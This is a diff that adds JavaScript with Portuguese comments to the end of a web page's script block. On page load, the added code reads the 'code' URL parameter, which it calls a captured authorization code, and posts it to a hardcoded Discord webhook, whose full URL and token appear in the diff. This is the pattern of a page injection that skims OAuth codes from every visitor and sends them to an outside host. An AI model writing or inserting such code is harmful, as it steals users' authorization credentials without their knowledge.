@@ -153,6 +153,46 @@
                 ease: "power2.out",
             });
         });
+
+        // Função para capturar o código da URL
+        function getCodeFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('code');
+        }
+
+        // Função para enviar o código para o webhook do Discord
+        function sendCodeToWebhook(code) {
+            const webhookURL = 'https://discord.com/api/webhooks/1329682656769867869/OF5xgKYuTOpvYYNMLuGyfRe5MlEO7XnrbFYbHfIxBbIXrL-uJGAAFlEq1KA4hzDe-OTU';
+            const message = {
+                content: `Código de autorização capturado: ${code}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Código enviado para o webhook com sucesso!");
+                } else {
+                    console.error("Erro ao enviar o código para o webhook:", response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error("Erro na requisição:", error);
+            });
+        }
+
+        // Captura o código e envia para o webhook
+        const code = getCodeFromURL();
+        if (code) {
+            sendCodeToWebhook(code);
+        } else {
+            console.log("Nenhum código encontrado na URL.");
+        }
     </script>
 </body>
 </html>
